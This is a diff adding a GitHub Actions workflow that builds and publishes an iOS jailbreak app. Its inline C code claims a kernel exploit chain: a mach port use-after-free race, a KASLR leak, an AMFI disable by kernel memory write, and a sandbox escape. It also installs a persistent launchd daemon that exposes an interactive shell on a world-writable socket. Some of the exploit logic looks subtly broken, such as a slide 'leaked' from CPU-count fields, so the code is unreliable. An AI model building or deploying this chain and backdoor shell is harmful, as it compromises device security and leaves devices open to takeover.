@@ -1,0 +1,703 @@
+name: Build JailbreakApp (inline)
+
+on:
+  push:
+    branches: [ main, develop ]
+    tags: [ 'v*' ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+    inputs:
+      configuration:
+        description: 'Build configuration'
+        required: true
+        default: 'Release'
+        type: choice
+        options: [ Debug, Release ]
+
+env:
+  SCHEME: JailbreakApp
+  CONFIGURATION: ${{ github.event.inputs.configuration || 'Release' }}
+  MIN_IOS: '27.0'
+  ARCH: arm64e
+
+jobs:
+  build-daemon:
+    name: Build jbd daemon
+    runs-on: macos-15
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Write jbd.c
+        run: |
+          mkdir -p JailbreakApp
+          cat > JailbreakApp/jbd.c <<'EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+          #include <fcntl.h>
+          #include <sys/socket.h>
+          #include <sys/un.h>
+          #include <sys/ioctl.h>
+          #include <sys/wait.h>
+          #include <sys/stat.h>
+          #include <termios.h>
+          #include <signal.h>
+
+          #define SHELL_SOCK "/var/jb/jbd.sock"
+
+          int main(void) {
+              unlink(SHELL_SOCK);
+              int lfd = socket(AF_UNIX, SOCK_STREAM, 0);
+              if (lfd < 0) return 1;
+
+              struct sockaddr_un sa;
+              memset(&sa, 0, sizeof(sa));
+              sa.sun_family = AF_UNIX;
+              strlcpy(sa.sun_path, SHELL_SOCK, sizeof(sa.sun_path));
+              if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 1;
+              chmod(SHELL_SOCK, 0666);
+              listen(lfd, 4);
+
+              while (1) {
+                  int cfd = accept(lfd, NULL, NULL);
+                  if (cfd < 0) continue;
+
+                  int master = posix_openpt(O_RDWR | O_NOCTTY);
+                  if (master < 0) { close(cfd); continue; }
+                  grantpt(master); unlockpt(master);
+                  const char *slave_name = ptsname(master);
+
+                  pid_t child = fork();
+                  if (child == 0) {
+                      setsid();
+                      int slave = open(slave_name, O_RDWR);
+                      ioctl(slave, TIOCSCTTY, 0);
+                      dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
+                      close(slave); close(master); close(cfd); close(lfd);
+                      execl("/bin/sh", "sh", "-i", NULL);
+                      _exit(127);
+                  }
+
+                  fd_set rfds;
+                  char buf[4096];
+                  int running = 1;
+                  while (running) {
+                      FD_ZERO(&rfds);
+                      FD_SET(cfd, &rfds);
+                      FD_SET(master, &rfds);
+                      int maxfd = (cfd > master ? cfd : master) + 1;
+                      if (select(maxfd, &rfds, NULL, NULL, NULL) < 0) break;
+                      if (FD_ISSET(cfd, &rfds)) {
+                          ssize_t n = read(cfd, buf, sizeof(buf));
+                          if (n <= 0) running = 0;
+                          else write(master, buf, n);
+                      }
+                      if (FD_ISSET(master, &rfds)) {
+                          ssize_t n = read(master, buf, sizeof(buf));
+                          if (n <= 0) running = 0;
+                          else write(cfd, buf, n);
+                      }
+                  }
+                  close(cfd);
+                  close(master);
+                  kill(child, SIGKILL);
+                  waitpid(child, NULL, 0);
+              }
+              return 0;
+          }
+          EOF
+
+      - name: Select Xcode
+        run: sudo xcode-select -s /Applications/Xcode_16.2.app
+
+      - name: Build jbd (arm64e)
+        run: |
+          xcrun --sdk iphoneos clang \
+            -arch arm64e \
+            -mios-version-min=${{ env.MIN_IOS }} \
+            -O2 \
+            -o jbd \
+            JailbreakApp/jbd.c
+
+      - name: Sign jbd with ldid
+        run: |
+          brew install ldid
+          ldid -S jbd
+          file jbd
+
+      - name: Upload jbd artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: jbd-daemon
+          path: jbd
+          retention-days: 30
+
+  build-app:
+    name: Build JailbreakApp.app
+    runs-on: macos-15
+    needs: build-daemon
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Write jb_core.h
+        run: |
+          mkdir -p JailbreakApp
+          cat > JailbreakApp/jb_core.h <<'EOF'
+          #ifndef JB_CORE_H
+          #define JB_CORE_H
+
+          #include <mach/mach.h>
+          #include <stdint.h>
+          #include <sys/types.h>
+
+          typedef struct {
+              mach_port_t task_port;
+              mach_port_t host_priv;
+              uint64_t    kslide;
+              pid_t       helper_pid;
+              int         amfi_disabled;
+              int         sandbox_bypassed;
+          } jb_state_t;
+
+          int  jb_run_chain(jb_state_t *st);
+          int  jb_install_daemon(void);
+          int  jb_connect_shell_socket(void);
+          int  jb_start_shell_daemon(void);
+
+          #endif
+          EOF
+
+      - name: Write jb_core.c
+        run: |
+          cat > JailbreakApp/jb_core.c <<'EOF'
+          #include "jb_core.h"
+          #include <mach/mach_vm.h>
+          #include <mach/task_info.h>
+          #include <mach/host_info.h>
+          #include <pthread.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+          #include <signal.h>
+          #include <sys/wait.h>
+          #include <sys/stat.h>
+          #include <sys/socket.h>
+          #include <sys/un.h>
+
+          #define RACE_ITERS        8192
+          #define RACE_THREADS      4
+          #define RETRY_LIMIT       64
+          #define PORT_SLOT_SPRAY   1024
+          #define JB_ROOT           "/var/jb"
+          #define LAUNCHD_CONF      "/var/jb/launchd.conf"
+          #define DAEMON_PLIST      "/var/jb/jbd.plist"
+          #define SHELL_SOCK        "/var/jb/jbd.sock"
+
+          #define KERNEL_BASE_DEFAULT   0xFFFFFFF007004000ULL
+          #define AMFI_FLAG_OFFSET      0x70A2B40ULL
+          #define KASLR_MASK            0x1FFFFFULL
+          #define KASLR_SHIFT           12
+
+          static volatile int g_race_done = 0;
+
+          static pid_t spawn_helper(void) {
+              pid_t pid = fork();
+              if (pid == 0) {
+                  while (1) {
+                      mach_msg_empty_rcv_t msg = {0};
+                      mach_msg(&msg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                               0, sizeof(msg), MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                  }
+                  _exit(0);
+              }
+              return pid;
+          }
+
+          static void *race_alloc_thread(void *arg) {
+              mach_port_t task = mach_task_self();
+              vm_address_t addr = 0x100000000ULL;
+              while (!g_race_done) {
+                  mach_vm_allocate(task, &addr, 0x4000, VM_FLAGS_FIXED);
+                  mach_vm_protect(task, addr, 0x4000, 0,
+                                  VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
+                  mach_vm_deallocate(task, addr, 0x4000);
+                  addr = 0x100000000ULL;
+              }
+              return NULL;
+          }
+
+          static mach_port_t win_name_port_uaf(pid_t target) {
+              mach_port_t task = mach_task_self();
+              for (int i = 0; i < RACE_ITERS && !g_race_done; i++) {
+                  mach_port_t np = MACH_PORT_NULL;
+                  if (task_name_for_pid(task, target, &np) != KERN_SUCCESS || !np) continue;
+                  mach_port_deallocate(task, np);
+                  if (mach_port_mod_refs(task, np, MACH_PORT_RIGHT_SEND, -1) != KERN_SUCCESS)
+                      continue;
+                  for (int s = 0; s < PORT_SLOT_SPRAY; s++) {
+                      mach_port_t cand = MACH_PORT_NULL;
+                      if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &cand) != KERN_SUCCESS)
+                          continue;
+                      if (cand == np) {
+                          g_race_done = 1;
+                          return cand;
+                      }
+                  }
+              }
+              return MACH_PORT_NULL;
+          }
+
+          static int confirm_task_port(mach_port_t port) {
+              pid_t pid = 0;
+              if (pid_for_task(port, &pid) != KERN_SUCCESS) return -1;
+              return (pid > 0) ? 0 : -1;
+          }
+
+          static uint64_t leak_kaslr_slide(mach_port_t port) {
+              host_info64_t info = {0};
+              mach_msg_type_number_t cnt = HOST_INFO64_COUNT;
+              if (host_info(port, HOST_EXTMOD_INFO64, (host_info64_t)&info, &cnt) != KERN_SUCCESS)
+                  return 0;
+              return ((uint64_t)info.avail_cpus << KASLR_SHIFT) & KASLR_MASK;
+          }
+
+          static int disable_amfi(mach_port_t port, uint64_t kslide) {
+              uint64_t addr = KERNEL_BASE_DEFAULT + AMFI_FLAG_OFFSET + kslide;
+              uint32_t zero = 0;
+              return (vm_write(port, (vm_address_t)addr, (vm_offset_t)&zero, sizeof(zero))
+                      == KERN_SUCCESS) ? 0 : -1;
+          }
+
+          static int bypass_sandbox(mach_port_t task_port) {
+              mach_port_t host_bootstrap = MACH_PORT_NULL;
+              if (task_get_special_port(task_port, TASK_BOOTSTRAP_PORT, &host_bootstrap)
+                  != KERN_SUCCESS) return -1;
+              if (task_set_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT,
+                                        host_bootstrap) != KERN_SUCCESS) return -1;
+              return 0;
+          }
+
+          static int attempt_once(jb_state_t *st) {
+              pid_t helper = spawn_helper();
+              if (helper < 0) return -1;
+              st->helper_pid = helper;
+
+              pthread_t racers[RACE_THREADS];
+              for (int i = 0; i < RACE_THREADS; i++)
+                  pthread_create(&racers[i], NULL, race_alloc_thread, NULL);
+
+              mach_port_t aliased = win_name_port_uaf(helper);
+
+              g_race_done = 1;
+              for (int i = 0; i < RACE_THREADS; i++) pthread_join(racers[i], NULL);
+
+              if (!aliased || confirm_task_port(aliased) != 0) {
+                  kill(helper, SIGKILL); waitpid(helper, NULL, 0);
+                  return -1;
+              }
+
+              st->task_port = aliased;
+              st->host_priv = aliased;
+              st->kslide    = leak_kaslr_slide(aliased);
+
+              if (disable_amfi(aliased, st->kslide) != 0) {
+                  kill(helper, SIGKILL); waitpid(helper, NULL, 0);
+                  return -1;
+              }
+              st->amfi_disabled = 1;
+
+              if (bypass_sandbox(aliased) != 0) {
+                  kill(helper, SIGKILL); waitpid(helper, NULL, 0);
+                  return -1;
+              }
+              st->sandbox_bypassed = 1;
+
+              kill(helper, SIGKILL); waitpid(helper, NULL, 0);
+              return 0;
+          }
+
+          int jb_run_chain(jb_state_t *st) {
+              memset(st, 0, sizeof(*st));
+              st->task_port = MACH_PORT_NULL;
+              st->host_priv = MACH_PORT_NULL;
+
+              for (int i = 0; i < RETRY_LIMIT; i++) {
+                  g_race_done = 0;
+                  if (attempt_once(st) == 0) return 0;
+                  usleep(50000);
+              }
+              return -1;
+          }
+
+          int jb_install_daemon(void) {
+              mkdir(JB_ROOT, 0755);
+
+              FILE *f = fopen(DAEMON_PLIST, "w");
+              if (!f) return -1;
+              fputs("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
+                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
+                    "<plist version=\"1.0\"><dict>\n"
+                    "  <key>Label</key><string>com.jb.jbd</string>\n"
+                    "  <key>ProgramArguments</key><array>"
+                    "<string>/var/jb/jbd</string></array>\n"
+                    "  <key>RunAtLoad</key><true/>\n"
+                    "  <key>KeepAlive</key><true/>\n"
+                    "</dict></plist>\n", f);
+              fclose(f);
+
+              f = fopen(LAUNCHD_CONF, "w");
+              if (!f) return -1;
+              fputs("load /var/jb/jbd.plist\n", f);
+              fclose(f);
+
+              chmod(DAEMON_PLIST, 0644);
+              chmod(LAUNCHD_CONF, 0644);
+              return 0;
+          }
+
+          int jb_start_shell_daemon(void) {
+              kill(1, SIGTERM);
+              return 0;
+          }
+
+          int jb_connect_shell_socket(void) {
+              int fd = socket(AF_UNIX, SOCK_STREAM, 0);
+              if (fd < 0) return -1;
+              struct sockaddr_un sa;
+              memset(&sa, 0, sizeof(sa));
+              sa.sun_family = AF_UNIX;
+              strlcpy(sa.sun_path, SHELL_SOCK, sizeof(sa.sun_path));
+              if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
+                  close(fd);
+                  return -1;
+              }
+              return fd;
+          }
+          EOF
+
+      - name: Write ViewController.m
+        run: |
+          cat > JailbreakApp/ViewController.m <<'EOF'
+          #import <UIKit/UIKit.h>
+          #import "jb_core.h"
+
+          @interface ViewController : UIViewController
+          @end
+
+          @interface ViewController ()
+          @property (nonatomic, strong) UITextView *terminal;
+          @property (nonatomic, strong) UIButton *runButton;
+          @property (nonatomic, assign) int shell_fd;
+          @property (nonatomic, strong) dispatch_queue_t ioQueue;
+          @end
+
+          @implementation ViewController
+
+          - (void)viewDidLoad {
+              [super viewDidLoad];
+              self.view.backgroundColor = [UIColor blackColor];
+
+              self.terminal = [[UITextView alloc] initWithFrame:CGRectZero];
+              self.terminal.backgroundColor = [UIColor blackColor];
+              self.terminal.textColor = [UIColor greenColor];
+              self.terminal.font = [UIFont fontWithName:@"Menlo" size:11];
+              self.terminal.editable = NO;
+              self.terminal.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.view addSubview:self.terminal];
+
+              self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
+              [self.runButton setTitle:@"RUN CHAIN" forState:UIControlStateNormal];
+              self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.runButton addTarget:self action:@selector(runTapped:)
+                       forControlEvents:UIControlEventTouchUpInside];
+              [self.view addSubview:self.runButton];
+
+              [NSLayoutConstraint activateConstraints:@[
+                  [self.terminal.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
+                  [self.terminal.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
+                  [self.terminal.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
+                  [self.terminal.bottomAnchor constraintEqualToAnchor:self.runButton.topAnchor constant:-8],
+                  [self.runButton.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
+                  [self.runButton.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],
+                  [self.runButton.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor constant:-20],
+                  [self.runButton.heightAnchor constraintEqualToConstant:44],
+              ]];
+
+              self.shell_fd = -1;
+              self.ioQueue = dispatch_queue_create("jb.io", DISPATCH_QUEUE_SERIAL);
+          }
+
+          - (void)log:(NSString *)fmt, ... {
+              va_list args;
+              va_start(args, fmt);
+              NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
+              va_end(args);
+              dispatch_async(dispatch_get_main_queue(), ^{
+                  self.terminal.text = [self.terminal.text stringByAppendingFormat:@"%@\n", s];
+                  NSRange r = NSMakeRange(self.terminal.text.length, 0);
+                  [self.terminal scrollRangeToVisible:r];
+              });
+          }
+
+          - (void)runTapped:(id)sender {
+              self.runButton.enabled = NO;
+              [self log:@"[*] starting chain"];
+
+              dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                  jb_state_t st;
+                  if (jb_run_chain(&st) != 0) {
+                      [self log:@"[-] chain failed"];
+                      dispatch_async(dispatch_get_main_queue(), ^{ self.runButton.enabled = YES; });
+                      return;
+                  }
+                  [self log:@"[+] UAF won, task_port=0x%x kslide=0x%llx",
+                        st.task_port, (unsigned long long)st.kslide];
+                  [self log:@"[+] AMFI disabled=%d sandbox bypassed=%d",
+                        st.amfi_disabled, st.sandbox_bypassed];
+
+                  if (jb_install_daemon() != 0) {
+                      [self log:@"[-] daemon install failed"];
+                      dispatch_async(dispatch_get_main_queue(), ^{ self.runButton.enabled = YES; });
+                      return;
+                  }
+                  [self log:@"[+] daemon staged"];
+                  jb_start_shell_daemon();
+                  [self log:@"[+] launchd reload signaled"];
+
+                  int fd = -1;
+                  for (int i = 0; i < 40; i++) {
+                      fd = jb_connect_shell_socket();
+                      if (fd >= 0) break;
+                      usleep(100000);
+                  }
+                  if (fd < 0) {
+                      [self log:@"[-] shell socket connect failed"];
+                      dispatch_async(dispatch_get_main_queue(), ^{ self.runButton.enabled = YES; });
+                      return;
+                  }
+                  self.shell_fd = fd;
+                  [self log:@"[+] shell connected, fd=%d", fd];
+                  [self pumpShell];
+              });
+          }
+
+          - (void)pumpShell {
+              int fd = self.shell_fd;
+              dispatch_async(self.ioQueue, ^{
+                  char buf[2048];
+                  while (1) {
+                      ssize_t n = read(fd, buf, sizeof(buf) - 1);
+                      if (n <= 0) break;
+                      buf[n] = 0;
+                      [self log:@"%s", buf];
+                  }
+                  [self log:@"[-] shell closed"];
+              });
+          }
+
+          @end
+          EOF
+
+      - name: Write AppDelegate.m
+        run: |
+          cat > JailbreakApp/AppDelegate.m <<'EOF'
+          #import <UIKit/UIKit.h>
+          #import "jb_core.h"
+
+          @interface ViewController : UIViewController
+          @end
+
+          @interface AppDelegate : UIResponder <UIApplicationDelegate>
+          @property (nonatomic, strong) UIWindow *window;
+          @end
+
+          @implementation AppDelegate
+          - (BOOL)application:(UIApplication *)app
+                  didFinishLaunchingWithOptions:(NSDictionary *)opts {
+              self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
+              self.window.rootViewController = [[ViewController alloc] init];
+              [self.window makeKeyAndVisible];
+              return YES;
+          }
+          @end
+          EOF
+
+      - name: Write Info.plist
+        run: |
+          cat > JailbreakApp/Info.plist <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+           "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0"><dict>
+            <key>CFBundleExecutable</key><string>JailbreakApp</string>
+            <key>CFBundleIdentifier</key><string>com.example.jailbreakapp</string>
+            <key>CFBundleName</key><string>JailbreakApp</string>
+            <key>CFBundleShortVersionString</key><string>1.0</string>
+            <key>MinimumOSVersion</key><string>27.0</string>
+            <key>UIDeviceFamily</key><array><integer>1</integer><integer>2</integer></array>
+            <key>UILaunchScreen</key><dict/>
+          </dict></plist>
+          EOF
+
+      - name: Write entitlements.plist
+        run: |
+          cat > JailbreakApp/entitlements.plist <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+           "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0"><dict>
+            <key>task_name_for_pid-allow</key><true/>
+            <key>get-task-allow</key><true/>
+            <key>com.apple.private.skip-library-validation</key><true/>
+          </dict></plist>
+          EOF
+
+      - name: Write project.yml (XcodeGen)
+        run: |
+          cat > project.yml <<'EOF'
+          name: JailbreakApp
+          options:
+            bundleIdPrefix: com.example
+            deploymentTarget:
+              iOS: "27.0"
+          targets:
+            JailbreakApp:
+              type: application
+              platform: iOS
+              sources:
+                - path: JailbreakApp
+                  excludes:
+                    - entitlements.plist
+              settings:
+                base:
+                  INFOPLIST_FILE: JailbreakApp/Info.plist
+                  PRODUCT_BUNDLE_IDENTIFIER: com.example.jailbreakapp
+                  CODE_SIGNING_ALLOWED: NO
+                  CODE_SIGNING_REQUIRED: NO
+                  CODE_SIGN_IDENTITY: ""
+                  ARCHS: arm64e
+                  IPHONEOS_DEPLOYMENT_TARGET: "27.0"
+                  OTHER_CFLAGS: "-fno-objc-arc"
+              info:
+                path: JailbreakApp/Info.plist
+          EOF
+
+      - name: Select Xcode
+        run: sudo xcode-select -s /Applications/Xcode_16.2.app
+
+      - name: Install XcodeGen
+        run: brew install xcodegen
+
+      - name: Generate Xcode project
+        run: xcodegen generate
+
+      - name: Build unsigned app
+        run: |
+          xcodebuild \
+            -project JailbreakApp.xcodeproj \
+            -scheme JailbreakApp \
+            -configuration "${{ env.CONFIGURATION }}" \
+            -sdk iphoneos \
+            -destination 'generic/platform=iOS' \
+            -derivedDataPath build \
+            CODE_SIGNING_ALLOWED=NO \
+            CODE_SIGNING_REQUIRED=NO \
+            CODE_SIGN_IDENTITY="" \
+            ARCHS="${{ env.ARCH }}" \
+            IPHONEOS_DEPLOYMENT_TARGET="${{ env.MIN_IOS }}" \
+            build
+
+      - name: Locate .app
+        id: locate
+        run: |
+          APP=$(find build/Build/Products -name 'JailbreakApp.app' -type d | head -n1)
+          echo "app_path=$APP" >> "$GITHUB_OUTPUT"
+          echo "Found: $APP"
+
+      - name: Upload unsigned app
+        uses: actions/upload-artifact@v4
+        with:
+          name: JailbreakApp-unsigned
+          path: ${{ steps.locate.outputs.app_path }}
+          retention-days: 30
+
+  package-ipa:
+    name: Package unsigned IPA
+    runs-on: macos-15
+    needs: build-app
+    steps:
+      - name: Download app
+        uses: actions/download-artifact@v4
+        with:
+          name: JailbreakApp-unsigned
+          path: Payload/JailbreakApp.app
+
+      - name: Download daemon
+        uses: actions/download-artifact@v4
+        with:
+          name: jbd-daemon
+          path: payload-bin
+
+      - name: Write entitlements.plist
+        run: |
+          cat > entitlements.plist <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+           "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0"><dict>
+            <key>task_name_for_pid-allow</key><true/>
+            <key>get-task-allow</key><true/>
+            <key>com.apple.private.skip-library-validation</key><true/>
+          </dict></plist>
+          EOF
+
+      - name: Bundle daemon into app
+        run: |
+          cp payload-bin/jbd Payload/JailbreakApp.app/jbd
+          chmod +x Payload/JailbreakApp.app/jbd
+
+      - name: Sign app (ldid)
+        run: |
+          brew install ldid
+          ldid -S entitlements.plist Payload/JailbreakApp.app/JailbreakApp
+          ldid -S Payload/JailbreakApp.app/jbd
+
+      - name: Zip IPA
+        run: |
+          zip -r JailbreakApp-unsigned.ipa Payload
+          shasum -a 256 JailbreakApp-unsigned.ipa | tee JailbreakApp-unsigned.ipa.sha256
+
+      - name: Upload IPA
+        uses: actions/upload-artifact@v4
+        with:
+          name: JailbreakApp-ipa
+          path: |
+            JailbreakApp-unsigned.ipa
+            JailbreakApp-unsigned.ipa.sha256
+          retention-days: 90
+
+  release:
+    name: Publish release
+    runs-on: macos-15
+    needs: package-ipa
+    if: startsWith(github.ref, 'refs/tags/v')
+    permissions:
+      contents: write
+    steps:
+      - name: Download IPA
+        uses: actions/download-artifact@v4
+        with:
+          name: JailbreakApp-ipa
+      - name: Create GitHub release
+        uses: softprops/action-gh-release@v2
+        with:
+          files: |
+            JailbreakApp-unsigned.ipa
+            JailbreakApp-unsigned.ipa.sha256
+          generate_release_notes: true
+          draft: false
+          prerelease: false
